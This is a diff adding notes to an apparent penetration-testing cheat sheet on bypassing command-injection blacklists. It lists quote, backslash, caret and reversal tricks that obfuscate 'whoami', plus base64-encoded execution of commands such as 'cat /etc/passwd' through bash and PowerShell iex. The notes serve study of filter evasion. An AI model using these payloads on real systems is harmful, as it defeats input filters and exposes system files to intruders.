@@ -70,3 +70,37 @@ $env:HOMEPATH[0]
 ```
 NOTE: We can also use the Get-ChildItem Env
 # Bypassing Blacklisted Commands
+- Obfuscation 
+```bash
+w'h'o'am'i
+w"h"o"am"i
+# Linux
+who$@ami
+w\ho\am\i
+$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
+$(a="WhOaMi";printf %s "${a,,}")
+$(rev<<<'imaohw')
+# Windows
+who^ami
+WhOaMi
+$('imaohw'[-1..-20] -join '')
+```
+NOTE: we cannot mix types of quotes and the number of quotes must be even
+- Encoded Command
+ ```bash
+# Linux
+# Encoding
+echo -n 'cat /etc/passwd | grep 33' | base64
+echo -n whoami | iconv -f utf-8 -t utf-16le | base64
+# Output
+Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
+# Executing
+bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
+# Windows
+# Encoding
+[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
+# Output
+dwBoAG8AYQBtAGkA
+# Executing
+iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
+```
